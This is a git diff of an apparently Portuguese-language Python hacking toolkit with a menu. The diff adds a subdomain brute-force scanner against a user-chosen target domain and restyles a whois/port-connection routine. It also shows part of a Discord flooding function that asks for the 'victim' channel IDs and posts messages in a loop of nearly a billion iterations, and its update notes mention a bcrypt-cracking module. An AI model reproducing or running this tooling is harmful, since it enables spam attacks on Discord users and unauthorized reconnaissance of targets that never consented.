@@ -1,5 +1,12 @@
 # encoding: utf-8
 #!/usr/bin/python3
+import re
+import timeit
+import threading
+import queue
+import signal
+import xmlrpc.client
+from itertools import islice
 import socket
 import os
 import sys
@@ -54,11 +61,11 @@ tReset = "\033[0;0m"
 # fim das cores.
 def notificaçoes():
   print(tAmarelo + """   .                       
-  (                              Notas de atualização:
-    \\                        
-     )       Adicionamos o módulo "crack bcrypt" no menu "FVCK_H4SH".
-##-------->  Por favor, baixem a wordlist que disponibilizamos como "senhas.txt"    
-     )       e dêem um upgrade no "requirements.txt".
+  (                           
+    \\                        λ ► Notas de atualização.
+     )       
+##-------->  Adicionamos um módulo de força bruta para subdomínios, na opção 7.    
+     )       Agradecemos ao wirecalvo por nos proporcionar sua ferramenta.
     /        
    (   """)
 def aviso():
@@ -126,17 +133,52 @@ def logo_printer():
         sys.stdout.flush()
         _logo_enumer +=1
         sleep(0.005)
-def whois():
-  #imports
-  try: 
-    import socket
-    import os
-    import argparse
-    from time import sleep
-  except:
-    print("[!]Dependencies not installed")
-  #end
+def SubBrute():
+  sleep(1)
+  print(""" 
+ +-+-+-+ +-+-+-+-+-+
+ |S|U|B| |B|R|U|T|E|
+ +-+-+-+ +-+-+-+-+-+
+""")
+  time.sleep(1.5)
+  print(tAmarelo + 'λ ► programado por wireroot')
+  time.sleep(0.5)
+  print(tAmarelo + 'λ ► github.com/wirecalvo')
+  time.sleep(1.5)
+  print(" ")
+  dom = input("""\033[35mDomínio alvo (sem o http/https)
+  λ ► """)
+  time.sleep(0.4)
+  wl = input(white + """Wordlist (digite "lista.txt" para a padrão (recomendada).
+  λ ► """)
+  file = open(wl, "r")
+  dns = file.read()
+  subdom = dns.splitlines()
+  time.sleep(2)
+  os.system(['clear', 'cls'][os.name == 'nt'])
+  print(""" 
+ +-+-+-+ +-+-+-+-+-+
+ |S|U|B| |B|R|U|T|E|
+ +-+-+-+ +-+-+-+-+-+
+""")
+  sleep(1)
+  print(tAmarelo + "=============================================")
+  print(tAmarelo +  f'[λ ►] Proucurando por subdomínios em {dom}')
+  print(tAmarelo + "=============================================")
+  print(" ")
+  time.sleep(1.5)
 
+  for subdomain in subdom:
+      if subdomain != True:
+          link = (f"http://{subdomain}.{dom}")
+          try:
+              requests.get(link)
+          except requests.ConnectionError:
+              pass
+          else:
+              print(white + '[►] Subdomínio encontrado: ', link)
+
+def whois():
   #colors
   RED            = "\033[1;31m"
   LIGHT_RED      = "\033[1;91m"
@@ -148,40 +190,54 @@ def whois():
 
   os.system(['clear', 'cls'][os.name == 'nt'])
   #logo
-  print(MAGENTA + """
-                                                                
-     ,---,                                                   ,--,    
-    '  .' \                                                ,--.'|    
-   /  ;    '.           ,----,  __  ,-.                    |  | :    
-  :  :       \        .'   .`|,' ,'/ /|                    :  : '    
-  :  |   /\   \    .'   .'  .''  | |' | ,--.--.     ,---.  |  ' |    
-  |  :  ' ;.   : ,---, '   ./ |  |   ,'/       \   /     \ '  | |    
-  |  |  ;/  \   \;   | .'  /  '  :  / .--.  .-. | /    /  ||  | :    
-  '  :  | \  \ ,'`---' /  ;--,|  | '   \__\/: . ..    ' / |'  : |__  
-  |  |  '  '--'    /  /  / .`|;  : |   ," .--.; |'   ;   /||  | '.'| 
-  |  :  :        ./__;     .' |  , ;  /  /  ,.  |'   |  / |;  :    ; 
-  |  | ,'        ;   |  .'     ---'  ;  :   .'   \   :    ||  ,   /  
-  `--''          `---'               |  ,     .-./\   \  /  ---`-'   
-                                      `--`---'     `----'            
-                                                                     
-
-  """)
+  sleep(1)
   print(RED + """
-  [+]Join in our Discord!
-  [!]https://discord.gg/v5d3PZ9 
+      [λ ►] Entrem em nosso servidor!
+      [λ ►] https://discord.gg/v5d3PZ9 
   """)
+  sleep(1)
   print(BLUE + """
-  [+]Subscribe in my channel!
-  [!]https://www.youtube.com/channel/UCret_G0WHRBQYG5MesldNjw
+      [λ ►] Se inscreva no canal do Slayyer!
+      [λ ►] https://www.youtube.com/channel/UCret_G0WHRBQYG5MesldNjw
   """)
+  sleep(1)
   print(GREEN + """
-  [+]Follow me in Github!
-  [!]https://github.com/slayyer-dev
+      [λ ►] Follow me in Github!
+      [λ ►] https://github.com/slayyer-dev
   """)
-  print(LIGHT_RED + "Fé pros reais: \nhttps://github.com/Gl4sya\nhttps://github.com/march0s1as\nhttps://github.com/zy0x157" + RESET)
+  sleep(1)
+  print(white + """
+      [λ ►] https://github.com/Gl4sya
+      [λ ►] https://github.com/march0s1as
+      [λ ►] https://github.com/zy0x157""" + RESET)
   #end
-
-  host = input("Host λ ►  ").strip()
+  sleep(3)
+  os.system(['clear', 'cls'][os.name == 'nt'])
+  print(fVermelho + """
+           .AMMMMMMMMMMA.          
+       .AV. :::.:.:.::MA.        
+      A' :..        : .:`A       
+     A'..              . `A.     Wh01s by Slayyer.
+    A' :.    :::::::::  : :`A           
+    M  .    :::.:.:.:::  . .M             
+    M  :   ::.:.....::.:   .M                       
+    V : :.::.:........:.:  :V    
+   A  A:    ..:...:...:.   A A   
+  .V  MA:.....:M.::.::. .:AM.M   
+ A'  .VMMMMMMMMM:.:AMMMMMMMV: A  
+:M .  .`VMMMMMMV.:A `VMMMMV .:M: 
+ V.:.  ..`VMMMV.:AM..`VMV' .: V  
+  V.  .:. .....:AMMA. . .:. .V   
+   VMM...: ...:.MMMM.: .: MMV    
+       `VM: . ..M.:M..:::M'      
+         `M::. .:.... .::M       
+          M:.  :. .... ..M       
+ VK       V:  M:. M. :M .V       
+          `V.:M.. M. :M.V'
+  """)
+  sleep(1)
+  host = input(tAmarelo + """IP do host: 
+  ►  """).strip()
   try:
     try:
       socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -202,10 +258,10 @@ def whois():
 
     except:
       os.system(['clear', 'cls'][os.name == 'nt'])
-      print(RED + "[!]Connection Failed" + RESET)
+      print(RED + "[λ ►] Falha na conexão." + RESET)
   except KeyboardInterrupt:
     os.system(['clear', 'cls'][os.name == 'nt'])
-    print(RED + "[!]The progam has been aborted!")
+    print(RED + "[λ ►] Tudo bem, você que pediu.. abortando programa.")
 
   sleep(2)
   print(RED + """                      
@@ -224,7 +280,6 @@ def whois():
           `.__,`---^---'       \ ` -'
              -.______  \ . /  ______,-
                      `.     ,'            
-
     """ + RESET)
   print("="*100)
 
@@ -595,7 +650,8 @@ def FVCK_DISCORD():
   """)
   print(" ")
   print(" ")
-  print(white + "Transcreva abaixo o ID da(s) vítima(s) --> ")
+  print(white + """Transcreva abaixo o ID da(s) vítima(s)
+  ► """)
   channelId = input()
   for _ in range(999999999):
       r = requests.post(f'https://discord.com/api/v8/channels/{channelId}/messages', headers=headers, json=payload)
@@ -616,9 +672,11 @@ def menu_principal():
   print(fVermelho + "                     ► QualMeuIp?      (04) ")
   print(fVermelho + "                     ► LocalizarIP     (05) ")
   print(fVermelho + "                     ► Wh01s¿          (06) ")
+  print(fVermelho + "                     ► SubBrute (new)  (07) ")
   print(" ")
   print(" ")
-  pergunta = input(white + "Olá. Qual opção lhe convém agora? --> ")
+  pergunta = input(white + """Olá. Qual opção lhe convém agora? 
+  λ ► """)
   if pergunta == "1":
     sleep(1)
     os.system(['clear', 'cls'][os.name == 'nt'])
@@ -640,6 +698,9 @@ def menu_principal():
   if pergunta == "6":
     os.system(['clear', 'cls'][os.name == 'nt'])
     whois()
+  if pergunta == "7":
+    os.system(['clear', 'cls'][os.name == 'nt'])
+    SubBrute()
   else:
     os.system(['clear', 'cls'][os.name == 'nt'])
     sleep(1)
